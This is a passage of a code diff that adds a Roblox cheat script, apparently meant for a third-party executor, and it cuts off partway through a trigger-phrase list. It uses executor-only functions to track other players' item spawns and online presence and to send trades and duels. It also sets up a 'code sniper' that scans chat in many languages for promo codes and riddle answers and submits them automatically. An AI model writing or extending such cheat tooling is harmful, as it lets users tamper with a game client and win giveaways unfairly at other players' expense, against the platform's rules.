+              local v86 = v85.Controller.GetOwnerUserId()
+
+              if v86 then
+                if Players:GetPlayerByUserId(v86) then
+                  fn47(v85, "server")
+                elseif not tbl28[v86] then
+                  tbl28[v86] = true
+                  table.insert(tbl27, v86)
+
+                  if v85.PresenceState ~= "ingame" then
+                    fn47(v85, "unknown")
+                  end
+                end
+              end
+            end
+
+            if #tbl27 == 0 or not request_ then
+              return
+            end
+            v84 += 1
+            local v85 = v84
+
+            task.spawn(function()
+              local ok, result = pcall(request_, {
+                Url = "https://presence.roblox.com/v1/presence/users",
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = service2:JSONEncode({ userIds = tbl27 }),
+              })
+
+              local flag16 = type(result) == "table"
+
+              if flag16 then
+                flag16 = tonumber(result.StatusCode or result.Status)
+              end
+
+              flag16 = flag16 or nil
+              local flag17 = not aceFinderRuntime.Running or v85 ~= v84 or not ok
+              local flag18
+
+              if flag17 then
+                flag18 = flag17
+              else
+                local v86 = "table"
+                flag18 = type(result) ~= v86
+              end
+
+              if flag18 or flag16 ~= 200 then
+                return
+              end
+
+              local ok2, result2 = pcall(function()
+                return service2:JSONDecode(result.Body or result.body)
+              end)
+
+              if not ok2 or type(result2) ~= "table" or type(result2.userPresences) ~= "table" then
+                return
+              end
+              local tbl29 = {}
+
+              for _, userPresence in ipairs(result2.userPresences) do
+                tbl29[userPresence.userId] = userPresence.userPresenceType
+              end
+
+              for _, v86 in ipairs(tbl26) do
+                local v87 = v86.Controller.GetOwnerUserId()
+                local v88 = v87 and tbl29[v87]
+
+                if v88 and not Players:GetPlayerByUserId(v87) then
+                  if v88 == 2 then
+                    fn47(v86, "ingame")
+                  else
+                    fn47(v86, "offline")
+                  end
+                end
+              end
+            end)
+          end
+
+          local n36 = 0
+
+          local function fn49(arg)
+            n36 += 1
+            local v85 = n36
+
+            task.delay(math.max(0, tonumber(arg) or 0), function()
+              if aceFinderRuntime.Running and v85 == n36 then
+                fn48()
+              end
+            end)
+          end
+
+          local function fn50(arg, arg2, arg3)
+            local num = tonumber(arg2)
+            if not arg or not num then
+              return false
+            end
+            local ownerDisplayName = type(arg3) == "string" and arg3 ~= "" and arg3 or arg.OwnerDisplayName
+            if arg.Controller.GetOwnerUserId() == num and (not ownerDisplayName or arg.OwnerDisplayName == ownerDisplayName) then
+              return true
+            end
+            arg.OwnerDisplayName = ownerDisplayName
+            arg.Controller.SetOwner(num, ownerDisplayName)
+            fn47(arg, Players:GetPlayerByUserId(num) and "server" or "unknown")
+            fn49(0.15)
+            return true
+          end
+
+          local function fn51(arg)
+            local v85 = fn38(arg)
+            if not v85 or not v85.Parent then
+              return nil, nil
+            end
+            local filler = v85:FindFirstChild("Filler")
+            filler = filler and filler:FindFirstChild("PlayerBg")
+            local username = filler and filler:FindFirstChild("Username")
+            if not filler or not filler.Visible or not username then
+              return nil, nil
+            end
+            local str8 = tostring(username.Text or ""):gsub("^@", "")
+            if str8 == "" or string.upper(str8) == "UNCLAIMED" then
+              return nil, nil
+            end
+            local headshot = filler:FindFirstChild("Headshot")
+
+            if headshot then
+              headshot = tonumber(tostring(headshot.Image or ""):match("id=(%d+)"))
+            end
+
+            headshot = headshot or nil
+
+            if not headshot then
+              for _, player in ipairs(Players:GetPlayers()) do
+                if player.Name == str8 or player.DisplayName == str8 then
+                  headshot = player.UserId
+                  break
+                end
+              end
+            end
+
+            return headshot, str8
+          end
+
+          local function fn52(arg, arg2)
+            if type(arg) ~= "table" or type(arg.BrainrotName) ~= "string" or arg.UID == nil then
+              return nil
+            end
+            local v85 = true
+            local flag16 = tbl23[fn37(arg.BrainrotName)] == v85
+            local uid = arg.UID
+            local v86 = fn43(uid)
+            local v87 = entries[v86]
+
+            if v87 then
+              if arg.OwnerUserId ~= nil then
+                fn50(v87, arg.OwnerUserId, arg.OwnerDisplayName)
+              end
+
+              local v88 = aceFinderRuntime.PendingClaimsByUID[v86]
+
+              if v88 then
+                aceFinderRuntime.PendingClaimsByUID[v86] = nil
+                fn50(v87, v88.UserId, v88.DisplayName)
+              end
+
+              return v87
+            end
+
+            local v88 = aceFinderRuntime.PendingClaimsByUID[v86]
+            local userId = v88 and v88.UserId or arg.OwnerUserId
+            local displayName = v88 and v88.DisplayName or arg.OwnerDisplayName
+            local flag17 = arg.IsLocalServer == true
+            local v89 = tbl24
+            local v90, v91 = fn42(
+              live.Scroll,
+              displayName,
+              displayName,
+              arg.BrainrotName,
+              arg.Mutation,
+              { OwnerUserId = userId, UID = arg.UID, IsOG = flag16 }
+            )
+            v83 += 1
+            v90:SetAttribute("SpawnSequence", v83)
+            v90.LayoutOrder = -v83
+            v90:SetAttribute("LiveboardUID", tostring(uid))
+            v90:SetAttribute("Scope", "LIVE")
+            v90:SetAttribute("SpawnScope", flag17 and "SERVER" or "GLOBAL")
+            table.insert(tbl24, v90)
+            v81()
+            local n37 = tonumber(arg.DisplayDuration) or 0
+            local serverTimeNow = tonumber(arg.Timestamp) or workspace:GetServerTimeNow()
+            local serverTimeNow2 = workspace:GetServerTimeNow()
+            local n38 = math.max(0, n37 - math.max(0, serverTimeNow2 - serverTimeNow))
+            local n39 = math.max(0, serverTimeNow2 - serverTimeNow)
+
+            local tbl27 = {
+              UID = uid,
+              UIDKey = v86,
+              Card = v90,
+              Controller = v91,
+              LinkedCards = v89,
+              BrainrotName = arg.BrainrotName,
+              Mutation = arg.Mutation,
+              IsOG = flag16,
+              Sequence = v83,
+              OwnerDisplayName = displayName,
+              IsLocalServer = flag17,
+              ExpiresAt = serverTimeNow2 + n38,
+              Expired = n38 <= 0,
+              SpawnedAt = serverTimeNow2 - n39,
+              PresenceState = v91.GetOwnerUserId() and "unknown" or "offline",
+              OnlineRemovalGeneration = 0,
+            }
+
+            v91.SetExpired(tbl27.Expired)
+            v91.SetSpawnAge(n39)
+            entries[v86] = tbl27
+            local v92 = aceFinderRuntime.PendingClaimsByUID[v86]
+
+            if v92 then
+              aceFinderRuntime.PendingClaimsByUID[v86] = nil
+              fn50(tbl27, v92.UserId, v92.DisplayName)
+            end
+
+            table.insert(tbl26, 1, tbl27)
+
+            while #tbl26 > 100 do
+              fn45(tbl26[#tbl26].UID)
+            end
+
+            if v91.GetOwnerUserId() then
+              fn47(tbl27, Players:GetPlayerByUserId(v91.GetOwnerUserId()) and "server" or "unknown")
+              fn49(0.15)
+            end
+
+            if arg2 and (not finderUISettingsState.OGOnlyEnabled or flag16) then
+              fn40(arg)
+            end
+
+            return tbl27
+          end
+
+          local function fn53()
+            local tbl27 = {}
+            local tbl28 = {}
+
+            for _, v85 in ipairs(tbl22) do
+              for _, v86 in pairs(v85) do
+                local v87 = "table"
+
+                if type(v86) == v87 and v86.UID ~= nil and typeof(v86.Frame) == "Instance" and not tbl28[fn43(v86.UID)] then
+                  local filler = v86.Frame:FindFirstChild("Filler")
+                  local name = nil
+                  local num = nil
+                  local str8 = nil
+                  local flag16 = false
+
+                  if filler then
+                    local brainrotBg = filler:FindFirstChild("BrainrotBg")
+                    brainrotBg = brainrotBg and brainrotBg:FindFirstChild("BrainrotViewport")
+                    brainrotBg = brainrotBg and brainrotBg:FindFirstChildOfClass("WorldModel")
+                    name = nil
+
+                    if brainrotBg then
+                      name = nil
+
+                      for _, child in ipairs(brainrotBg:GetChildren()) do
+                        if child:IsA("Model") then
+                          name = child.Name
+                          break
+                        else
+                          name = nil
+                        end
+                      end
+                    end
+
+                    local title = filler:FindFirstChild("Title")
+
+                    if not name and title and title:IsA("TextLabel") then
+                      name = tostring(title.Text or ""):gsub("<[^>]+>", "")
+                    end
+
+                    local location = filler:FindFirstChild("Location")
+
+                    if location and location:IsA("TextLabel") then
+                      flag16 = tostring(location.Text):find("[SERVER]", 1, true) ~= nil
+                    end
+
+                    local playerBg = filler:FindFirstChild("PlayerBg")
+                    local username = playerBg and playerBg:FindFirstChild("Username")
+                    local headshot = playerBg and playerBg:FindFirstChild("Headshot")
+                    local isTextLabel = playerBg and playerBg.Visible and username and username:IsA("TextLabel")
+                    str8 = nil
+
+                    if isTextLabel then
+                      local str9 = tostring(username.Text or "")
+                      local flag17 = str9 ~= "" and string.upper(str9) ~= "UNCLAIMED"
+                      str8 = nil
+
+                      if flag17 then
+                        str8 = str9:gsub("^@", "")
+                      end
+                    end
+
+                    local isImageLabel = headshot and (headshot:IsA("ImageLabel") or headshot:IsA("ImageButton"))
+                    num = nil
+
+                    if isImageLabel then
+                      num = tonumber(tostring(headshot.Image or ""):match("[?&]id=(%d+)"))
+                    end
+                  end
+
+                  local v88 = fn43(v86.UID)
+
+                  if type(name) == "string" and name ~= "" and v88 then
+                    tbl28[v88] = true
+
+                    table.insert(tbl27, {
+                      UID = v86.UID,
+                      BrainrotName = name,
+                      Timestamp = tonumber(v86.SpawnedAt) or workspace:GetServerTimeNow(),
+                      DisplayDuration = tonumber(v86.Duration) or 300,
+                      IsLocalServer = flag16,
+                      OwnerUserId = num,
+                      OwnerDisplayName = str8,
+                    })
+                  end
+                end
+              end
+            end
+
+            table.sort(tbl27, function(arg, arg2)
+              return (tonumber(arg.Timestamp) or 0) < (tonumber(arg2.Timestamp) or 0)
+            end)
+
+            local v85 = 0
+
+            for _, v86 in ipairs(tbl27) do
+              if fn52(v86, false) then
+                v85 += 1
+              end
+            end
+
+            return v85
+          end
+
+          if remotes.NewEntry then
+            fn31(remotes.NewEntry.OnClientEvent, function(arg)
+              fn52(arg, true)
+            end)
+          end
+
+          if remotes.ClaimEntry then
+            fn31(remotes.ClaimEntry.OnClientEvent, function(arg, arg2, arg3)
+              local v85 = fn43(arg)
+              local num = tonumber(arg2)
+              if not v85 or not num then
+                return
+              end
+              local v86 = entries[v85]
+              if not v86 then
+                aceFinderRuntime.PendingClaimsByUID[v85] = { UserId = num, DisplayName = arg3, ReceivedAt = os.clock() }
+                return
+              end
+              fn50(v86, num, arg3)
+            end)
+          end
+
+          fn31(Players.PlayerAdded, function(arg)
+            for _, v85 in ipairs(tbl26) do
+              local userId = arg.UserId
+
+              if v85.Controller.GetOwnerUserId() == userId then
+                fn47(v85, "server")
+              end
+            end
+
+            fn49(0.15)
+          end)
+
+          fn31(Players.PlayerRemoving, function(arg)
+            for _, v85 in ipairs(tbl26) do
+              local userId = arg.UserId
+
+              if v85.Controller.GetOwnerUserId() == userId then
+                fn47(v85, "unknown")
+              end
+            end
+
+            fn49(0.5)
+          end)
+
+          local function fn54(arg)
+            if not aceFinderRuntime.Running then
+              return
+            end
+
+            if arg then
+              aceFinderRuntime.InitialEntries = fn53()
+              aceFinderRuntime.Status = "READY"
+            end
+
+            for _, v85 in ipairs(tbl26) do
+              if not v85.Controller.GetOwnerUserId() then
+                local v86, v87 = fn51(v85.UID)
+
+                if v86 then
+                  fn50(v85, v86, v87)
+                end
+              end
+            end
+          end
+
+          fn54(true)
+          local n37 = 0
+          local n38 = 0
+          local n39 = 0
+
+          fn31(RunService2.Heartbeat, function(arg)
+            n37 += arg
+            n38 += arg
+            n39 += arg
+
+            if n37 >= 0.25 then
+              n37 = 0
+              local serverTimeNow = workspace:GetServerTimeNow()
+
+              for i = #tbl26, 1, -1 do
+                local v85 = tbl26[i]
+                local n40 = math.max(0, serverTimeNow - v85.SpawnedAt)
+                v85.Controller.SetSpawnAge(n40)
+
+                if v85.OnlineController then
+                  v85.OnlineController.SetSpawnAge(n40)
+                end
+
+                if not v85.Expired and v85.ExpiresAt <= serverTimeNow then
+                  v85.Expired = true
+                  v85.Controller.SetExpired(true)
+                end
+              end
+            end
+
+            if n38 >= 10 then
+              n38 = 0
+              fn48()
+            end
+
+            if n39 >= 0.75 then
+              n39 = 0
+              local n40 = os.clock() - 30
+
+              for k, v85 in pairs(aceFinderRuntime.PendingClaimsByUID) do
+                local flag16 = type(v85) ~= "table"
+
+                if not flag16 then
+                  flag16 = (tonumber(v85.ReceivedAt) or 0) < n40
+                end
+
+                if flag16 then
+                  aceFinderRuntime.PendingClaimsByUID[k] = nil
+                end
+              end
+
+              fn54(false)
+            end
+          end)
+
+          aceFinderRuntime.Unload = function()
+            if not aceFinderRuntime.Running then
+              return
+            end
+            aceFinderRuntime.Running = false
+
+            for _, connection in ipairs(aceFinderRuntime.Connections) do
+              pcall(function()
+                connection:Disconnect()
+              end)
+            end
+
+            table.clear(aceFinderRuntime.Connections)
+            fn32()
+          end
+
+          aceFinderRuntime.Remotes = remotes
+          aceFinderRuntime.RemoteMapper = aceRemoteMapper
+          aceFinderRuntime.Entries = entries
+        end
+
+        aceFinderRuntime.SendTrade = sendTrade
+        aceFinderRuntime.SendDuel = sendDuel
+        aceFinderRuntime.Gui = screenGui2
+        aceFinderRuntime.PlayOpenAnimation = playOpenAnimation
+
+        screenGui2.Destroying:Connect(function()
+          if genv3.ACEFinderRuntime == aceFinderRuntime then
+            aceFinderRuntime.Unload()
+          end
+        end)
+
+        local function fn43(parent)
+          if not parent:IsA("GuiButton") or parent:GetAttribute("ACEClickAnimated") then
+            return
+          end
+          parent:SetAttribute("ACEClickAnimated", true)
+          local aceClickScale = parent:FindFirstChild("ACEClickScale")
+
+          if not aceClickScale then
+            aceClickScale = Instance.new("UIScale")
+            aceClickScale.Name = "ACEClickScale"
+            aceClickScale.Scale = 1
+            aceClickScale.Parent = parent
+          end
+
+          local n36 = 0
+
+          parent.Activated:Connect(function()
+            n36 += 1
+            local v83 = n36
+            TweenService2:Create(aceClickScale, TweenInfo.new(0.07, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Scale = 0.92 })
+              :Play()
+
+            task.delay(0.07, function()
+              if v83 ~= n36 or not aceClickScale.Parent then
+                return
+              end
+              local tbl26 = { Scale = 1 }
+              TweenService2:Create(aceClickScale, TweenInfo.new(0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out), tbl26):Play()
+            end)
+          end)
+        end
+
+        for _, descendant in ipairs(screenGui2:GetDescendants()) do
+          fn43(descendant)
+        end
+
+        screenGui2.DescendantAdded:Connect(function(descendant)
+          task.defer(fn43, descendant)
+        end)
+      end
+
+      fn27 = function()
+        local v75, v76, v77, v78, v79, localPlayer2, playerGui, flag15, n32, tbl18
+        local fn31, tbl19, codeSniper, tbl20, v80, v81, autoSubmit, aiAutoSubmit, backupRiddle, submitAfter
+        local tbl21, n33, n34, n35, v82, connection, connection2, tbl22, retypeInvalid, riddleSolver
+        local n36, str7, v83, v84, n37, v85, tbl23, fn32, fn33, fn34
+        local fn35, str8, net, getupvalues_, v86, n38, flag16, flag17, n39, fn36
+        local fn37, tbl24, fn38, fn39, fn40, fn41, fn42, fn43, fn44
+
+        do
+          local fn45 = cloneref or function(arg)
+            return arg
+          end
+
+          local v87 = fn45(game:GetService("Players"))
+          v75 = fn45(game:GetService("ReplicatedStorage"))
+          v76 = fn45(game:GetService("RunService"))
+          v77 = fn45(game:GetService("TweenService"))
+          v78 = fn45(game:GetService("UserInputService"))
+          local v88 = fn45(game:GetService("HttpService"))
+          v79 = fn45(game:GetService("Lighting"))
+          localPlayer2 = v87.LocalPlayer
+          playerGui = localPlayer2:WaitForChild("PlayerGui")
+
+          if getgenv and getgenv().StopAura then
+            pcall(getgenv().StopAura)
+          end
+
+          flag15 = false
+
+          pcall(function()
+            if v78.TouchEnabled and not v78.KeyboardEnabled then
+              local currentCamera = workspace.CurrentCamera
+              local viewportSize = currentCamera and currentCamera.ViewportSize or Vector2.new(1920, 1080)
+              flag15 = math.min(viewportSize.X, viewportSize.Y) < 600
+            end
+          end)
+
+          n32 = flag15 and 0.6 or 1
+
+          tbl18 = {
+            codeSniper = true,
+            autoListen = false,
+            autoSubmit = true,
+            aiAutoSubmit = true,
+            backupRiddle = false,
+            submitAfter = 3,
+            retypeInvalid = false,
+            riddleSolver = false,
+            backgroundIndex = 2,
+            guiScale = flag15 and 1 or 0.92,
+            windowPosition = nil,
+            optimization = {},
+            anchorBind = "",
+            autoBuyBind = "",
+          }
+
+          pcall(function()
+            if type(isfile) == "function" and type(readfile) == "function" and isfile("ace_code_sniper_auto_redeem_test_config.json") then
+              local data = v88:JSONDecode(readfile("ace_code_sniper_auto_redeem_test_config.json"))
+
+              if type(data) == "table" then
+                if type(data.codeSniper) == "boolean" then
+                  tbl18.codeSniper = data.codeSniper
+                end
+
+                local v89 = "boolean"
+
+                if type(data.autoListen) == v89 then
+                  tbl18.autoListen = data.autoListen
+                end
+
+                local v90 = "boolean"
+
+                if type(data.autoSubmit) == v90 then
+                  tbl18.autoSubmit = data.autoSubmit
+                end
+
+                if type(data.aiAutoSubmit) == "boolean" then
+                  tbl18.aiAutoSubmit = data.aiAutoSubmit
+                end
+
+                if type(data.backupRiddle) == "boolean" then
+                  tbl18.backupRiddle = data.backupRiddle
+                end
+
+                if type(data.submitAfter) == "number" then
+                  tbl18.submitAfter = math.clamp(math.floor(data.submitAfter), 1, 4)
+                end
+
+                if type(data.retypeInvalid) == "boolean" then
+                  tbl18.retypeInvalid = data.retypeInvalid
+                end
+
+                if type(data.riddleSolver) == "boolean" then
+                  tbl18.riddleSolver = data.riddleSolver
+                end
+
+                local v91 = "number"
+
+                if type(data.backgroundIndex) == v91 then
+                  tbl18.backgroundIndex = math.max(1, math.floor(data.backgroundIndex))
+                end
+
+                if type(data.guiScale) == "number" then
+                  tbl18.guiScale = math.clamp(data.guiScale, 0.5, 1.5)
+                end
+
+                if type(data.optimization) == "table" then
+                  for k, v92 in pairs(data.optimization) do
+                    local flag18 = type(k) == "string"
+
+                    if flag18 then
+                      local v93 = "boolean"
+                      flag18 = type(v92) == v93
+                    end
+
+                    if flag18 then
+                      tbl18.optimization[k] = v92
+                    end
+                  end
+                end
+
+                if type(data.anchorBind) == "string" then
+                  tbl18.anchorBind = data.anchorBind
+                end
+
+                local v92 = "function"
+
+                if type(data.autoBuyBind) == v92 then
+                  tbl18.autoBuyBind = data.autoBuyBind
+                end
+
+                if
+                  type(data.windowPosition) == "table"
+                  and type(data.windowPosition.xScale) == "number"
+                  and type(data.windowPosition.xOffset) == "number"
+                  and type(data.windowPosition.yScale) == "number"
+                  and type(data.windowPosition.yOffset) == "number"
+                then
+                  tbl18.windowPosition = {
+                    xScale = data.windowPosition.xScale,
+                    xOffset = data.windowPosition.xOffset,
+                    yScale = data.windowPosition.yScale,
+                    yOffset = data.windowPosition.yOffset,
+                  }
+                end
+              end
+            end
+          end)
+
+          fn31 = function()
+            if type(writefile) ~= "function" then
+              return
+            end
+
+            pcall(function()
+              writefile(
+                "ace_code_sniper_auto_redeem_test_config.json",
+                v88:JSONEncode({
+                  codeSniper = tbl18.codeSniper,
+                  autoListen = tbl18.autoListen,
+                  autoSubmit = tbl18.autoSubmit,
+                  aiAutoSubmit = tbl18.aiAutoSubmit,
+                  backupRiddle = tbl18.backupRiddle,
+                  submitAfter = tbl18.submitAfter,
+                  retypeInvalid = tbl18.retypeInvalid,
+                  riddleSolver = tbl18.riddleSolver,
+                  backgroundIndex = tbl18.backgroundIndex,
+                  guiScale = tbl18.guiScale,
+                  windowPosition = tbl18.windowPosition,
+                  optimization = tbl18.optimization,
+                  anchorBind = tbl18.anchorBind,
+                  autoBuyBind = tbl18.autoBuyBind,
+                })
+              )
+            end)
+          end
+
+          tbl19 = {
+            enabled = tbl18.autoListen,
+            armed = false,
+            token = 0,
+            timeout = 120,
+            cooldown = 8,
+            readyAt = 0,
+            windowLimit = 6,
+            windowGap = 12,
+            window = {},
+            windowAt = 0,
+            driving = false,
+            patterns = {},
+            strongPatterns = {},
+            triggers = {
+              "code is",
+              "codes is",
+              "the code is",
+              "use code",
+              "use the code",
+              "use this code",
+              "using code",
+              "enter code",
+              "enter the code",
+              "enter this code",
+              "type code",
+              "type the code",
+              "type this code",
+              "type in",
+              "paste the code",
+              "paste this code",
+              "copy the code",
+              "copy this code",
+              "write this down",
+              "next code",
+              "new code",
+              "another code",
+              "code time",
+              "code drop",
+              "dropping a code",
+              "drop a code",
+              "dropping code",
+              "free code",
+              "secret code",
+              "bonus code",
+              "gift code",
+              "promo code",
+              "special code",
+              "limited code",
+              "exclusive code",
+              "quick code",
+              "first code",
+              "last code",
+              "final code",
+              "one more code",
+              "code word",
+              "codeword",
+              "code number",
+              "code below",
+              "code coming",
+              "code incoming",
+              "incoming code",
+              "code for you",
+              "code will be",
+              "here is the code",
+              "heres the code",
+              "here's the code",
+              "got a code",
+              "have a code",
+              "get this code",
+              "take this code",
+              "typing a code",
+              "spelling a code",
+              "spelling out",
+              "spelling it out",
+              "letter by letter",
+              "redeem code",
+              "redeem the code",
+              "redeem this",
+              "redeem this code",
+              "redeem it",
+              "claim this",
+              "claim the code",
+              "claim your",
+              "grab this",
+              "open your codes",
+              "open the codes",
+              "codes menu",
+              "code alert",
+              "code activated",
+              "code released",
+              "releasing a code",
+              "releasing the code",
+              "new drop",
+              "big drop",
+              "drop incoming",
+              "drop time",
+              "reward code",
+              "event code",
+              "update code",
+              "daily code",
+              "weekend code",
+              "birthday code",
+              "milestone code",
+              "sammy code",
+              "want a code",
+              "who wants a code",
+              "need a code",
+              "code hunt",
+              "in the chat",
+              "watch the chat",
+              "watch chat",
+              "eyes on chat",
+              "chat code",
+              "coming up",
+              "next up",
+              "here it comes",
+              "here goes",
+              "here you go",
+              "one word at a time",
+              "word by word",
+              "piece by piece",
+              "in parts",
+              "in pieces",
+              "first part",
+              "second part",
+              "third part",
+              "last part",
+              "final part",
+              "part one",
+              "part two",
+              "start typing",
+              "get typing",
+              "keyboard ready",
+              "on three",
+              "count of three",
+              "3 2 1",
+              "riddle",
+              "riddles",
+              "riddle me",
+              "riddle time",
+              "next riddle",
+              "new riddle",
+              "another riddle",
+              "last riddle",
+              "final riddle",
+              "bonus riddle",
+              "riddle number",
+              "one more riddle",
+              "brain teaser",
+              "brainteaser",
+              "quiz",
+              "quiz time",
+              "pop quiz",
+              "solve this",
+              "solve it",
+              "solve the",
+              "decode this",
+              "decode it",
+              "figure this out",
+              "figure it out",
+              "work it out",
+              "answer this",
+              "answer the",
+              "answer is",
+              "the answer",
+              "the question is",
+              "correct answer",
+              "right answer",
+              "guess this",
+              "guess the",
+              "guess what",
+              "question",
+              "trivia",
+              "puzzle",
+              "unscramble",
+              "scrambled",
+              "word scramble",
+              "jumbled",
+              "anagram",
+              "math",
+              "spell",
+              "true or false",
+              "odd one out",
+              "complete the",
+              "finish the",
+              "rhymes with",
+              "starts with",
+              "ends with",
+              "count the",
+              "sum of",
+              "add up",
+              "multiply",
+              "divide",
+              "subtract",
+              "equals",
+              "what am i",
+              "what has",
+              "what is",
+              "what goes",
+              "what number",
+              "what word",
+              "whats the",
+              "what's the",
+              "who am i",
+              "who's the",
+              "whos the",
+              "which one",
+              "how many",
+              "how much",
+              "name the",
+              "fill in the blank",
+              "lets test",
+              "let's test",
+              "test your",
+              "think fast",
+              "think you know",
+              "bet you cant",
+              "bet you can't",
+              "can you solve",
+              "can you guess",
+              "can you name",
+              "can you answer",
+              "who knows",
+              "anyone know",
+              "does anyone know",
+              "tell me the",
+              "type the answer",
+              "answer fast",
+              "answer quickly",
+              "first correct",
+              "correct answer gets",
+              "no googling",
+              "no cheating",
+              "listen up",
+              "pay attention",
+              "attention",
+              "heads up",
+              "eyes up",
+              "eyes here",
+              "look here",
+              "get ready",
+              "ready up",
+              "here we go",
+              "here comes",
+              "hurry",
+              "be quick",
+              "be fast",
+              "type fast",
+              "type quick",
+              "hands on your keyboard",
+              "first to type",
+              "first to say",
+              "first to answer",
+              "first person to",
+              "first one to",
+              "fastest",
+              "quickest",
+              "whoever gets",
+              "whoever types",
+              "whoever answers",
+              "giveaway",
+              "for free",
+              "win a",
+              "the winner",
+              "prize",
+              "reward",
+              "codigo es",
+              "el codigo es",
+              "codigo nuevo",
+              "nuevo codigo",
+              "codigo gratis",
+              "usa el codigo",
+              "usen el codigo",
+              "usa este codigo",
+              "escribe el codigo",
+              "escriban el codigo",
+              "aqui esta el codigo",
+              "canjea",
+              "canjear",
+              "canjeen",
+              "acertijo",
+              "adivinanza",
+              "adivina",
+              "la respuesta es",
+              "responde",
+              "respondan",
+              "pregunta",
+              "el primero en",
+              "atencion",
+              "preparados",
+              "preparense",
+              "recompensa",
+              "premio",
+              "regalo",
+              "codigo e",
+              "o codigo e",
+              "codigo novo",
+              "novo codigo",
+              "use o codigo",
+              "usem o codigo",
+              "digite o codigo",
+              "aqui esta o codigo",
+              "resgate",
+              "resgatar",
+              "adivinha",
+              "adivinhe",
+              "charada",
+              "a resposta e",
+              "responda",
+              "o primeiro a",
+              "premiacao",
+              "code est",
+              "le code est",
+              "nouveau code",
+              "code gratuit",
+              "voici le code",
+              "utilise le code",
+              "utilisez le code",
+              "tapez le code",
+              "echangez",
+              "enigme",
+              "devinette",
+              "la reponse est",
+              "repondez",
+              "le premier a",
+              "recompense",
+              "cadeau",
+              "code ist",
+              "der code ist",
+              "neuer code",
+              "gratis code",
+              "hier ist der code",
+              "code eingeben",
+              "gib den code",
+              "einlosen",
+              "ratsel",
+              "die antwort ist",
+              "antworte",
+              "frage",
+              "der erste",
+              "achtung",
+              "belohnung",
+              "geschenk",
+              "codice e",
+              "il codice e",
+              "nuovo codice",
+              "codice gratis",
+              "usa il codice",
+              "ecco il codice",
+              "riscatta",
+              "indovinello",
+              "la risposta e",
+              "rispondi",
+              "domanda",
+              "il primo a",
+              "attenzione",
+              "ricompensa",
+              "de code is",
+              "nieuwe code",
+              "hier is de code",
+              "raadsel",
+              "het antwoord is",
+              "beloning",
+              "kod to",
+              "nowy kod",
+              "darmowy kod",
+              "wpisz kod",
+              "zagadka",
+              "odpowiedz to",
+              "nagroda",
+              "yeni kod",
+              "bedava kod",
+              "kodu kullan",
+              "iste kod",
+              "bilmece",
+              "bulmaca",
+              "cevap",
+              "odul",
+              "kodenya",
+              "kode baru",
+              "kode gratis",
+              "gunakan kode",
+              "teka teki",
+              "tebak",
+              "jawabannya",
+              "hadiah",
+              "ang code ay",
+              "bagong code",
+              "libreng code",
+              "bugtong",
+              "sagot ay",
+              "premyo",
+              "ma la",
+              "code moi",
+              "ma moi",
+              "mien phi",
+              "cau do",
+              "dap an",
+              "tra loi",
+              "phan thuong",
+              "codul este",
+              "cod nou",
+              "ghicitoare",
+              "raspunsul este",
+              "premiu",
+              "код это",
+              "новый код",
+              "бесплатный код",
+              "введите код",
+              "загадка",
+              "ответ",
+              "награда",
+              "приз",
+            },
+          }
+
+          local tbl25 = { ["ß"] = "ss" }
+
+          for k, v89 in pairs({
+            a = "àáâãäåĀĂĄÀÁÂÃÄÅāăą",
+            e = "èéêëĒĔĖĘĚÈÉÊËēĕėęě",
+            i = "ìíîïĨĪĬĮıÌÍÎÏĩīĭįİ",
+            o = "òóôõöøŌŎŐÒÓÔÕÖØōŏő",
+            u = "ùúûüŨŪŬŮŰŲÙÚÛÜũūŭůűų",
+            y = "ýÿŷÝŶŸ",
+            c = "çćĉċčÇĆĈĊČ",
+            d = "ďđĎĐ",
+            g = "ĝğġģĜĞĠĢ",
+            l = "ĺļľłŀĹĻĽŁĿ",
+            n = "ñńņňÑŃŅŇ",
+            r = "ŕŗřŔŖŘ",
+            s = "śŝşšŚŜŞŠ",
+            t = "ţťŧŢŤŦ",
+            z = "źżžŹŻŽ",
+          }) do
+            for match in v89:gmatch("[\194-\244][\128-\191]*") do
+              tbl25[match] = k
+            end
+          end
+
+          tbl19.normalize = function(arg)
+            return " "
+              .. tostring(arg or "")
+                :gsub("[\194-\244][\128-\191]*", function(arg2)
+                  return tbl25[arg2] or arg2
+                end)
+                :lower()
+                :gsub("[^%w\128-\255]+", " ")
+                :gsub("^%s+", "")
+                :gsub("%s+$", "")
+              .. " "
+          end
+
+          tbl19.push = function(arg)
+            local windowAt = tbl19.windowAt
+
+            if os.clock() - windowAt > tbl19.windowGap then
+              tbl19.window = {}
+            end
+
+            tbl19.windowAt = os.clock()
+            tbl19.window[#tbl19.window + 1] = arg
+
+            while tbl19.windowLimit < #tbl19.window do
+              table.remove(tbl19.window, 1)
+            end
+
+            return table.concat(tbl19.window, " ")
+          end
+
+          tbl19.match = function(arg)
+            if #tbl19.patterns == 0 then
+              for _, trigger in ipairs(tbl19.triggers) do
+                local v89 = tbl19.normalize(trigger)
+
+                if #v89 > 2 then
+                  tbl19.patterns[#tbl19.patterns + 1] = v89
+
+                  if not tbl19.isWeak(v89:match("^%s*(.-)%s*$")) then
+                    tbl19.strongPatterns[#tbl19.strongPatterns + 1] = v89
+                  end
+                end
+              end
+            end
+
+            local v89 = tbl19.normalize(arg)
+
+            for _, strongPattern in ipairs(tbl19.strongPatterns) do
+              if v89:find(strongPattern, 1, true) then
+                return (strongPattern:match("^%s*(.-)%s*$"))
+              end
+            end
+
+            for _, pattern in ipairs(tbl19.patterns) do
+              if v89:find(pattern, 1, true) then
+                return (pattern:match("^%s*(.-)%s*$"))
+              end
+            end
+
+            return nil
+          end
+
+          tbl19.weak = {
+            "answer is",
+            "the answer",
+            "answer the",
+            "correct answer",
+            "right answer",
+            "the question is",
+            "correct answer gets",
+            "equals",
+            "prize",
+            "reward",
+            "the winner",
+            "win a",
+            "giveaway",
+            "for free",
+            "riddle",
+            "riddles",
+            "question",
+            "trivia",
+            "puzzle",
+            "quiz",
+            "math",
+            "spell",
+            "attention",
+            "pay attention",
+            "hurry",
+            "fastest",
+            "quickest",
+            "la respuesta es",
+            "responde",
+            "respondan",
+            "pregunta",
+            "recompensa",
+            "premio",
+            "regalo",
+            "acertijo",
+            "adivinanza",
+            "adivina",
+            "atencion",
+            "preparados",
+            "preparense",
+            "a resposta e",
+            "responda",
+            "premiacao",
+            "adivinha",
+            "adivinhe",
+            "charada",
+            "la reponse est",
+            "repondez",
+            "recompense",
+            "cadeau",
+            "enigme",
+            "devinette",
+            "die antwort ist",
+            "antworte",
+            "frage",
